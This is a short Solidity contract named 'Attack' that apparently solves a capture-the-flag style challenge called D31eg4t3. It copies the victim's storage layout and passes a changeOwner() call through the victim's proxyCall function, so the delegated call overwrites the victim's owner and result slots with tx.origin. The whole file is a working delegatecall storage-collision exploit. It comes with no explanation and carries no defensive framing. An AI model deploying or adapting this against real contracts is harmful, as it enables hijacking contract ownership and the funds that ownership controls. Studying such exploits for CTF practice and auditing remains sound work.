// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ID31eg4t3 {
    function proxyCall(bytes calldata data) external returns (address);
    function changeResult() external;
}

contract Attack {
    address internal immutable victim;
    uint256 v1 = 23421223356;
    uint256 v2 = 3654513134567;
    uint256 v3 = 45665465178;
    uint256 v4 = 45652156156478;
    address public owner;
    mapping(address => bool) public result;
        
    constructor(address addr) payable {
        victim = addr;
    }

    function changeOwner() public {
        owner = tx.origin;
        result[owner] = true;
    }

    function exploit() external {
        bytes memory data = abi.encodeWithSignature("changeOwner()");
        ID31eg4t3(victim).proxyCall(data);
    }
}
